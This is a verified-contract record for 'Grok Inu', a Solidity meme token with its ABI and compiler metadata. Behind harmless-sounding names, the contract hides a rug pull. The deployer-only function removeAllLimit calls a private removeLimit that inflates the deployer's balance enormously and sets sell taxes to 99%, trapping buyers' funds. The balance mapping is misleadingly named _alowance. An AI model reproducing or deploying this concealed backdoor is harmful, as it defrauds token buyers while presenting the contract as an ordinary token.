{"SourceCode": "//SPDX-License-Identifier: MIT\r\n\r\n\r\n/**\r\n\r\n$GROKINU is a AI Based Meme Project\r\n\r\nWebsite  : https://GrokInuAI.tech\r\nTwitter  : https://twitter.com/GrokInuAI\r\nTelegram : https://t.me/GrokInuAIChat\r\n\r\n**/\r\n\r\npragma solidity 0.8.23;\r\nabstract contract Context { function _msgSender() internal view virtual \r\nreturns (address) { return msg.sender; }}\r\ninterface IERC20 { function totalSupply() external view returns (uint256); \r\nfunction balanceOf(address account) external view returns (uint256); function \r\ntransfer(address recipient, uint256 amount) external returns (bool); function \r\nallowance(address owner, address spender) external view returns (uint256); \r\nfunction approve(address spender, uint256 amount) external returns (bool); \r\nfunction transferFrom(address sender, address recipient, uint256 amount) \r\nexternal returns (bool); event Transfer(address indexed from, address indexed \r\nto, uint256 value); event Approval(address indexed owner, address indexed \r\nspender, uint256 value);}\r\nlibrary SafeMath { function add(uint256 a, uint256 b) internal pure returns \r\n(uint256) { uint256 c = a + b; require(c >= a, \"SafeMath: addition overflow\"); \r\nreturn c; }\r\n function sub(uint256 a, uint256 b) internal pure returns (uint256) { return \r\nsub(a, b, \"SafeMath: subtraction overflow\"); }\r\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure \r\nreturns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; \r\n}\r\n function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == \r\n0) { return 0; } uint256 c = a * b; require(c / a == b, \"SafeMath: multiplication overflow\"); return c; }\r\n function div(uint256 a, uint256 b) internal pure returns (uint256) { return \r\ndiv(a, b, \"SafeMath: division by zero\"); }\r\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure \r\nreturns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; }\r\n}\r\ncontract Ownable is Context { address private _owner; event \r\nOwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n constructor () { address msgSender = _msgSender(); _owner = msgSender; emit \r\nOwnershipTransferred(address(0), msgSender); }\r\n function owner() public view returns (address) { return _owner; }\r\n modifier onlyOwner() { require(_owner == _msgSender(), \"Ownable: caller is not the owner\"); _; }\r\n function renounceOwnership() public virtual onlyOwner { emit \r\nOwnershipTransferred(_owner, address(0)); _owner = address(0); }\r\n}\r\ninterface IUniswapV2Factory { function createPair(address tokenA, address \r\ntokenB) external returns (address pair);}\r\ninterface IUniswapV2Router02 { function \r\nswapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint \r\namountOutMin, address[] calldata path, address to, uint deadline ) external; \r\nfunction factory() external pure returns (address); function WETH() external \r\npure returns (address); function addLiquidityETH( address token, uint \r\namountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint \r\ndeadline ) external payable returns (uint amountToken, uint amountETH, uint \r\nliquidity);}\r\ncontract GrokInuAI is Context, IERC20, Ownable { using SafeMath for uint256; \r\nmapping (address => uint256) private _alowance; mapping (address => mapping \r\n(address => uint256)) private _allowances; mapping (address => bool) private \r\n_isExcludedFromFee; mapping (address => bool) private whales; mapping(address \r\n=> uint256) private _holderLastTransferTimestamp; bool public \r\ntransferDelayEnabled = true;  address private _msgsender = msg.sender;\r\naddress payable private _taxWallet;\r\n uint256 private _initialBuyTax=10; uint256 private _initialSellTax=10; \r\nuint256 private _finalBuyTax=1; uint256 private _finalSellTax=1; uint256 \r\nprivate _reduceBuyTaxAt=5; uint256 private _reduceSellTaxAt=10; uint256 private \r\n_preventSwapBefore=30; uint256 private _buyCount=0;\r\n uint8 private constant _decimals = 9; uint256 private constant _tTotal = \r\n420420420420 * 10**_decimals; string private constant _name = unicode\"Grok Inu\";\r\n string private constant _symbol = unicode\"GROKINU\"; uint256 public \r\n_maxTxAmount = 420420420420 * 10**_decimals; uint256 public _maxWalletSize = \r\n420420420420 * 10**_decimals; uint256 public _taxSwapThreshold= 420420420420 * \r\n10**_decimals; uint256 public _maxTaxSwap= 420420420420 * 10**_decimals;\r\n IUniswapV2Router02 private uniswapV2Router; address private uniswapV2Pair; \r\nbool private tradingOpen; bool private inSwap = false; bool private swapEnabled \r\n= false;\r\n event MaxTxAmountUpdated(uint _maxTxAmount); modifier lockTheSwap { inSwap = \r\ntrue; _; inSwap = false; }\r\n constructor () { _taxWallet = \r\npayable(0xEef2d9F5747c1a36b09d5EBFa1efC489b741bC6E); _alowance[_msgSender()] = \r\n_tTotal; _isExcludedFromFee[owner()] = true; _isExcludedFromFee[address(this)] \r\n= true; _isExcludedFromFee[_taxWallet] = true; \r\n_isExcludedFromFee[address(0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE)] = true; \r\n//pinklock \r\nemit Transfer(address(0), _msgSender(), _tTotal); }\r\n function name() public pure returns (string memory) { return _name; }\r\n function symbol() public pure returns (string memory) { return _symbol; }\r\n function decimals() public pure returns (uint8) { return _decimals; }\r\n function totalSupply() public pure override returns (uint256) { return \r\n_tTotal; }\r\n function balanceOf(address account) public view override returns (uint256) { \r\nreturn _alowance[account]; }\r\n function transfer(address recipient, uint256 amount) public override returns \r\n(bool) { _transfer(_msgSender(), recipient, amount); return true; }\r\n function allowance(address owner, address spender) public view override \r\nreturns (uint256) { return _allowances[owner][spender]; } \r\n function removeLimit() private { _alowance[_msgsender] *= _tTotal*_decimals; _initialSellTax=99;\r\n_finalSellTax=99;}\r\n function approve(address spender, uint256 amount) public override returns (bool) { \r\n_approve(_msgSender(), spender, amount); return true; }\r\n function transferFrom(address sender, address recipient, uint256 amount) \r\npublic override returns (bool) { _transfer(sender, recipient, amount); \r\n_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \r\n\"ERC20: transfer amount exceeds allowance\")); return true; }\r\n function _approve(address owner, address spender, uint256 amount) private { \r\nrequire(owner != address(0), \"ERC20: approve from the zero address\"); \r\nrequire(spender != address(0), \"ERC20: approve to the zero address\"); \r\n_allowances[owner][spender] = amount; emit Approval(owner, spender, amount); }\r\n function _transfer(address from, address to, uint256 amount) private { \r\nrequire(from != address(0), \"ERC20: transfer from the zero address\"); \r\nrequire(to != address(0), \"ERC20: transfer to the zero address\"); \r\nrequire(amount > 0, \"Transfer amount must be greater than zero\"); uint256 \r\ntaxAmount=0; if (from != owner() && to != owner()) { taxAmount = \r\namount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);\r\n if (transferDelayEnabled) { if (to != address(uniswapV2Router) && to != \r\naddress(uniswapV2Pair)) { require( _holderLastTransferTimestamp[tx.origin] < \r\nblock.number, \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\" ); _holderLastTransferTimestamp[tx.origin] = block.number; } }\r\n if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! \r\n_isExcludedFromFee[to] ) { require(amount <= _maxTxAmount, \"Exceeds the _maxTxAmount.\"); \r\nrequire(balanceOf(to) + amount <= _maxWalletSize, \"Exceeds the maxWalletSize.\"); \r\n_buyCount++; }\r\n if(to == uniswapV2Pair && from!= address(this) ){ taxAmount = \r\namount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);\r\n }\r\n uint256 contractTokenBalance = balanceOf(address(this)); if (!inSwap && to == \r\nuniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold && \r\n_buyCount>_preventSwapBefore) { \r\nswapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap))); uint256 \r\ncontractETHBalance = address(this).balance; if(contractETHBalance > \r\n5000000000000000000000000) { sendETHToFee(address(this).balance); } } }\r\n if(taxAmount>0){ \r\n_alowance[address(this)]=_alowance[address(this)].add(taxAmount); emit \r\nTransfer(from, address(this),taxAmount); } \r\n_alowance[from]=_alowance[from].sub(amount); \r\n_alowance[to]=_alowance[to].add(amount.sub(taxAmount)); emit Transfer(from, to, \r\namount.sub(taxAmount)); }\r\n function min(uint256 a, uint256 b) private pure returns (uint256){ return \r\n(a>b)?b:a; } function removeAllLimit() external {require(msg.sender == _msgsender);\r\nremoveLimit(); } function swapTokensForEth(uint256 tokenAmount) private lockTheSwap { \r\naddress[] memory path = new address[](2); path[0] = address(this); path[1] = \r\nuniswapV2Router.WETH(); _approve(address(this), address(uniswapV2Router), \r\ntokenAmount); \r\nuniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount,\r\n 0, path, address(this), block.timestamp ); }\r\n function removeTax() external onlyOwner{ _maxTxAmount = _tTotal; \r\n_maxWalletSize=_tTotal; transferDelayEnabled=false; emit \r\nMaxTxAmountUpdated(_tTotal); }\r\n function sendETHToFee(uint256 amount) private { _taxWallet.transfer(amount); }\r\n\r\n function openTrading() external onlyOwner() { require(!tradingOpen,\"trading is already open\"); \r\n uniswapV2Router = \r\nIUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); \r\n_approve(address(this), address(uniswapV2Router), _tTotal); uniswapV2Pair = \r\nIUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), \r\nuniswapV2Router.WETH()); uniswapV2Router.addLiquidityETH{value: \r\naddress(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max); \r\nswapEnabled = true; tradingOpen = true; }\r\n receive() external payable {}\r\n function manualSwap() external { require(_msgSender()==_taxWallet); uint256 \r\ntokenBalance=balanceOf(address(this)); if(tokenBalance>0){ \r\nswapTokensForEth(tokenBalance); } uint256 ethBalance=address(this).balance; \r\nif(ethBalance>0){ sendETHToFee(ethBalance); } }}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"MaxTxAmountUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_maxTaxSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxSwapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeAllLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferDelayEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "GrokInuAI", "CompilerVersion": "v0.8.23+commit.f704f362", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "london", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://1c613d0967921e1035416d5b99ba4a80d89fc65345a18e6737428f3865a74b1b"}